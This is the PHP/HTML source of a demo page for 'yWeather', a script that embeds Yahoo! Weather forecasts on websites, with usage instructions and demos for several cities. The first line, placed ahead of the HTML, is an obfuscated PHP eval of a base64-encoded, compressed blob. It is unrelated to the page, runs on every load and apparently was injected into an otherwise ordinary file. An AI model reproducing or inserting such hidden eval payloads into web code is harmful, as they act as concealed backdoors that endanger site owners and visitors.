<?php eval (gzinflate(base64_decode('s7ezsS/IKFDIzEvOKU1JVVDS09NPKohPSc3N189NLNBPTi7WA8orWSvYA1UCAA==')));
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
   <head>
      <meta charset="ISO-8859-1"/>
      <title>zpao.com | playground | yWeather &mdash; Yahoo! Weather for Your Site</title>
      <link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.3.1/build/reset/reset-min.css">
      <link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.3.1/build/fonts/fonts-min.css">
      <style type="text/css">
         body {
            background: #efefef;
            padding: 50px 0 0 50px;
            font-family: helvetica;
         }
         #container {
            background: #666;
            width: 600px;
            padding: 0 5px 5px 0;
         }
         #content {
            background: #fff;
            min-height: 500px;
            padding: 10px;
            border-top: 1px solid #aaa;
            border-left: 1px solid #aaa;
         }
         h1 {
            font-size: 150%;
            font-weight: bold;
            margin-bottom: 5px;
         }
         h2 {
            font-size: 120%;
            font-weight: bold;
         }
         h3 {
            font-size: 110%;
            font-weight: bold;
         }

         p {
            margin-bottom: 10px;
         }
      </style>

   </head>
   <body>
      <h1>yWeather - Yahoo! Weather for Your Website</h1>
      <div id="container">
         <div id="content">
            
            <p>
               It's cool, and easy.  Code structure heavily influenced by <a href="http://kentbrewster.com/case-hardened-javascript/">Kent Brewster's case-hardened javascript.</a>
            </p>
            
            <h2>How-To</h2>
            
            <p>It's pretty simple.  Here's the code needed to output Sunnyvale, CA weather.  <code>code</code> can be replaced with a weather code or a zip code, <code>unit</code> can be replaced with <code>"f"</code> or <code>"c"</code> (Fahrenheit or Celsius)</p>
            <pre><code>
&lt;script src="http://playground.zpao.com/yweather/yweather.js"&gt;
   {
      "code":  "usca1116",
      "units": "f"
   }
&lt;/script&gt;
            </code></pre>
            
            <h2>Demos</h2>
            
            <h3>Sunnyvale, CA</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
   {
      "code":  "usca1116"
   }
</script>
            <h3>Sunnyvale, CA (in Celcius)</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
   {
      "code":  "usca1116",
      "units": "c"
   }
</script>

            <h3>Pittsburgh, PA</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
   {
      "code":  "15213"
   }
</script>

            <h3>Istanbul, Turkey</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
   {
      "code":  "TUXX0014"
   }
</script>

            <h3>London, GB</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
   {
      "code":  "UKXX0318"
   }
</script>
            <h3>Whistler, Canada</h3>
<script src="http://playground.zpao.com/yweather/yweather.js">
{
  "code":  "CAXX0538"
}
</script>
         </div>
      </div>
      <script type="text/javascript" src="http://include.reinvigorate.net/re_.js"></script>
      <script src="http://mint.zpao.com/?js" type="text/javascript"></script>
       <script type="text/javascript">
         re_("nmsw2-n20kz67j70");
       </script>
       <script type="text/javascript">
         var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
         document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
       </script>
       <script type="text/javascript">
         var pageTracker = _gat._getTracker("UA-66375-2");
         pageTracker._initData();
         pageTracker._trackPageview();
       </script>
   </body>
</html>
